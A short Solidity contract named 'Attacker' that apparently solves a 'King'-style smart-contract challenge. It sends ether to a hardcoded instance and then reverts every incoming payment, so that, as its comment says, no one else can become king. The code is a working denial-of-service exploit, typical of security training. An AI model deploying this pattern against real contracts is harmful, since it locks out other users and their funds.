pragma solidity ^0.8.13;

import "./King.sol";

contract Attacker {
    
    address instance = 0xE01d613e4511E78979C41D8a0c3Ca83F056E050E;

    function attack() external payable {
        instance.call{value: msg.value}("");
    }
    // by always reverting, the attacker can prevent anyone from becoming king
    receive() external payable {
        revert();
    }
}